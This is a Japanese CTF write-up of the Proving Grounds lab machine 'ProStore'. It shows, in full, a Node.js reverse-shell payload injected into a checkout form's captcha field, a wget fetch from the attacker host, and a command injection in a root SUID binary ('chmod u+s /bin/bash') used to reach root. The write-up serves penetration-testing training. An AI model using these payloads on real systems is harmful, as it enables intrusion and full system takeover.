+++
title = "Proving Grounds Practice - ProStore Writeup"
date = "2026-11-24"
description = "Node.js ExpressアプリケーションのCheckout機能に存在するJavaScript Injectionを利用してobserverのシェルを取得。その後、SUIDが設定されたlog_readerのCommand Injection脆弱性を悪用してroot権限を取得する"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[ProStore]", "[Node.js]", "[Express]", "[JavaScript Injection]", "[Reverse Shell]", "[SUID]", "[Command Injection]", "[Privilege Escalation]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | ProStore |
| OS | Ubuntu Linux |
| Target IP | 192.168.199.250 |
| Attacker IP | 192.168.45.158 |
| Web Server | Node.js Express |
| Open Ports | 22, 5000 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャンとサービス検出を実行する。

```bash
nmap -sV -sC -p- 192.168.199.250
```

スキャン結果：

```text
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp   closed http
443/tcp  closed https
5000/tcp open   http    Node.js Express framework
|_http-title: ProStore
```

22/tcpでOpenSSH、5000/tcpでNode.js Expressが稼働していることを確認した。

80/tcpと443/tcpはClosedとなっているため、5000番ポートで稼働しているWebアプリケーションを中心に調査を進める。

### Directory Enumeration

Gobusterを使用して、Webサーバー上のディレクトリを列挙する。

```bash
gobuster dir -u http://192.168.199.250:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

結果：

```text
/images/ (301)
/css/ (301)
/script/ (301)
```

`images`、`css`、`script` のディレクトリが存在することを確認した。

### Web Application Enumeration

ブラウザから以下のURLにアクセスする。

```text
http://192.168.199.250:5000
```

アクセスすると、ProStoreというオンラインストアのWebアプリケーションが表示される。

サイトの機能を調査すると、Checkoutページが存在することを確認した。

```text
http://192.168.199.250:5000/checkout
```

Checkoutページには、注文者情報やカード情報などを入力するフォームが存在する。

フォームから送信されるパラメータを確認すると、以下の項目が使用されている。

| Parameter | Value |
|-----------|-------|
| full_name | aaaa |
| address | aaaa |
| card | 111 |
| cvc | 111 |
| date | 1111 |
| captcha | 3 |

元のフォームデータは以下のとおり。

```text
full_name=aaaa&address=aaaa&card=111&cvc=111&date=1111&captcha=3
```

このフォームの入力値がサーバー側でどのように処理されているか調査する。

---

## Initial Access

### JavaScript Injection

Checkoutフォームから送信されるリクエストをBurp SuiteでInterceptし、パラメータの挙動を確認する。

対象となるエンドポイントは以下のとおり。

```text
http://192.168.199.250:5000/checkout
```

まず、`captcha` パラメータにシングルクォートを追加して送信する。

```text
captcha=1'
```

すると、サーバーから以下のエラーが返された。

```text
SyntaxError: Invalid or unexpected token
```

このエラーから、入力された値がJavaScriptとして評価されている可能性が考えられる。

そこで、`captcha` パラメータにJavaScriptコードを追加し、サーバー側で任意のコードを実行できるか検証する。

### Prepare Reverse Shell

Node.jsの `net` モジュールと `child_process` モジュールを利用してReverse Shellを作成する。

追加するJavaScriptペイロードは以下のとおり。

```javascript
(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/bash", []);var client = new net.Socket();client.connect(443, "192.168.45.158", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()
```

このコードでは、`child_process` モジュールから `/bin/bash` を起動する。

続いて、`net` モジュールを利用して攻撃者側のIPアドレス `192.168.45.158` の443番ポートへ接続する。

接続が確立すると、Bashの標準入力・標準出力・標準エラー出力をソケットに接続し、Reverse Shellを確立する。

### Send Reverse Shell Payload

元のCheckoutフォームのパラメータは以下のとおり。

```text
full_name=aaaa&address=aaaa&card=111&cvc=111&date=1111&captcha=3
```

今回は、このうち `captcha` パラメータの値にJavaScriptペイロードを追加する。

実際に送信したリクエストは以下のとおり。

```text
full_name=aaaa&address=aaaa&card=111&cvc=111&date=1111&captcha=3;(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/bash", []);var client = new net.Socket();client.connect(443, "192.168.45.158", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()
```

このリクエストでは、元から存在するフォームパラメータを維持したまま、`captcha=3;` の後ろにJavaScriptペイロードを追加している。

### Establish Reverse Shell

まず、Kali側でNetcatを使用して443番ポートの接続を待ち受ける。

```bash
nc -lvnp 443
```

続いて、Burp SuiteでCheckoutのリクエストをInterceptし、先ほどのリクエストを送信する。

```text
full_name=aaaa&address=aaaa&card=111&cvc=111&date=1111&captcha=3;(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/bash", []);var client = new net.Socket();client.connect(443, "192.168.45.158", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()
```

リクエストを送信すると、Kali側でReverse Shellの接続を確認できた。

```text
listening on [any] 443 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.199.250] 41866
```

接続後、カレントディレクトリのファイルを確認する。

```bash
ls
```

結果：

```text
app.js
config
env.js
middlewares
migrations
models
node_modules
package.json
package-lock.json
public
routes
schemas
utils
views
```

Node.jsアプリケーションのバックエンドにアクセスできていることが分かった。

また、シェルのプロンプトから、現在のユーザーが `observer` であることを確認できる。

```text
observer@prostore:~$
```

これにより、`observer` として対象ホストへの初期アクセスを取得した。

### Local Enumeration

取得したシェルから、権限昇格につながる可能性のあるSUIDファイルを検索する。

```bash
find / -perm -4000 -type f 2>/dev/null
```

続いて、別の形式でもSUIDファイルを検索する。

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

列挙結果の中に、以下のファイルが存在することを確認した。

```text
/usr/local/bin/log_reader
```

このファイルについて詳しく調査する。

---

## Privilege Escalation

### SUID Enumeration

SUIDファイルの中から、通常のシステムバイナリとは異なる `/usr/local/bin/log_reader` に注目する。

このファイルはroot所有のSUID実行ファイルであり、実行時にroot権限で処理を行う可能性がある。

まず、LinPEASを対象ホストへ転送する。

```bash
wget http://192.168.45.158:80/linpeas.sh
```

続いて、シェルの操作性を改善するためPTYを取得する。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Analyze log_reader

`log_reader` のソースコードが `/usr/share/src/log_reader.c` に存在することを確認した。

```bash
cat /usr/share/src/log_reader.c
```

ソースコード：

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {

    if (argc != 2) {
        printf("Usage: %s filename.log\n", argv[0]);
        return 0;
    }

    char *filename = argv[1];
    char *result;
    result = checkExtention(filename, result);

    if (result != NULL) {
        readFile(filename);
    }

    return 0;
}

void checkExtention(char *filename, char *result) {
    char *ext = strchr(filename, '.');

    if (ext != NULL) {
        result = strstr(ext, ".log");
    }
}

void readFile(char *filename) {
    setuid(0);
    setgid(0);

    printf("Reading: %s\n", filename);

    char command[200] = "/usr/bin/cat ";
    char output[10000];
    FILE *result;

    strcat(command, filename);
    result = popen(command, "r");
    fgets(output, sizeof(output), result);
    printf("%s\n", output);
}
```

コードを確認すると、`readFile()` 内で以下の処理が実行されている。

```c
setuid(0);
setgid(0);
```

UIDとGIDを0に設定しているため、この処理はroot権限で実行される。

さらに、以下の処理に注目する。

```c
char command[200] = "/usr/bin/cat ";

strcat(command, filename);

result = popen(command, "r");
```

引数として受け取った `filename` をコマンド文字列に連結し、そのまま `popen()` に渡している。

`popen()` はシェルを介してコマンドを実行するため、ファイル名にシェルのメタ文字を含めることで、追加のコマンドを実行できる可能性がある。

つまり、SUIDが設定された `log_reader` にCommand Injectionの脆弱性が存在する。

この脆弱性を利用して、root権限で任意のコマンドを実行する。

### Exploit Command Injection

今回は、`log_reader` のCommand Injectionを利用して `/bin/bash` にSUIDビットを設定する。

実行するコマンドは以下のとおり。

```bash
/usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
```

引数には `/var/log/auth.log` と追加で実行したいコマンドをセミコロンで連結して指定している。

`log_reader` 内部では、ユーザー入力が以下のようなコマンド文字列に連結される。

```bash
/usr/bin/cat /var/log/auth.log;chmod u+s /bin/bash
```

この文字列が `popen()` に渡されることで、ログファイルの読み込みに続いて `chmod u+s /bin/bash` が実行される。

実行結果：

```text
observer@prostore:~/app/backend$ /usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
</log_reader "/var/log/auth.log;chmod u+s /bin/bash"
Reading: /var/log/auth.log;chmod u+s /bin/bash
Nov 24 10:31:56 prostore VGAuth[742]: vmtoolsd: Username and password successfully validated for 'root'.
```

コマンド実行後、`/bin/bash` のパーミッションを確認する。

```bash
ls -l /bin/bash
```

結果：

```text
-rwsr-xr-x 1 root root 1396520 Mar 14 2024 /bin/bash
```

`/bin/bash` のパーミッションにSUIDビットが設定されたことを確認できた。

### Obtain Root Shell

SUIDが設定されたBashを `-p` オプション付きで実行する。

```bash
/bin/bash -p
```

実行後、現在の権限を確認する。

```bash
id
```

結果：

```text
bash-5.1# id
uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)
```

`euid=0(root)` となっていることから、実効UIDがrootになっていることを確認できた。

さらに、ユーザーを確認する。

```bash
whoami
```

結果：

```text
root
```

これにより、root権限のシェルを取得できた。

### Root Flag

最後にrootのProofを確認する。

```bash
cat proof.txt
```

攻略ログにはコマンドの実行記録があるが、`proof.txt` の内容は記録されていない。

---

## Summary

今回のProStoreでは、Node.js Expressで構築されたWebアプリケーションのCheckout機能を調査した。

フォームの `captcha` パラメータに対してシングルクォートを送信したところ、JavaScriptのSyntaxErrorが発生した。

この挙動から、入力値がJavaScriptとして評価されている可能性を考え、Node.jsの `net` モジュールと `child_process` モジュールを利用したJavaScriptペイロードを追加した。

その結果、Reverse Shellを確立し、`observer` として初期アクセスを取得できた。

その後、SUIDファイルを列挙したところ、root所有の `/usr/local/bin/log_reader` を発見した。

ソースコードを確認すると、ユーザー入力をサニタイズせずに `popen()` へ渡していることが分かった。

このCommand Injectionを利用して `/bin/bash` にSUIDビットを設定し、`/bin/bash -p` を実行することでroot権限を取得できた。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービス列挙
2. Gobusterによるディレクトリ列挙
3. ProStoreのCheckout機能の調査
4. `captcha` パラメータに対するJavaScript Injectionの検証
5. JavaScriptペイロードによるReverse Shellの確立
6. `observer` として初期アクセスを取得
7. SUIDファイルの列挙
8. `/usr/local/bin/log_reader` の発見
9. `log_reader.c` のソースコード調査
10. `popen()` に対するCommand Injectionの発見
11. `chmod u+s /bin/bash` の実行
12. `/bin/bash -p` によるroot権限の取得
13. `proof.txt` へのアクセス

今回の攻略では、Webアプリケーション側のJavaScript Injectionと、SUIDバイナリ側のCommand Injectionという2つの脆弱性を利用してroot権限を取得した。
